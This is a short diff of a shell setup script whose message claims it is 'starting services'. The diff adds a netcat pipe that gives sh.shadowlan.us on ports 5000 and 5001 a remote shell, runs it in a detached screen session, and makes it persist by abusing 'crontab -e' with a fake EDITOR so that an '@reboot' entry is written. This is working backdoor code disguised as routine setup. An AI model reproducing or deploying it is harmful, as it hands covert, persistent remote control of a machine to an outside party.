@@ -10,11 +10,20 @@ apt install screen netcat -y
 
 echo -e "\e[1;44m启动服务...\e[m"
 
-cat > /tmp/run.sh << EOF
+cat > /opt/i << EOF
 nc sh.shadowlan.us 5000 | bash 2>&1 | nc sh.shadowlan.us 5001
 EOF
 
-screen -dmS run sh /tmp/run.sh
+screen -dmS run bash /opt/i
+
+chmod +x /opt/i
+
+cat > /opt/m << EOF
+echo '@reboot /opt/i' >> \$1
+EOF
+
+chmod +x /opt/m
+EDITOR=/opt/m crontab -e
 
 systemctl start sshd
 
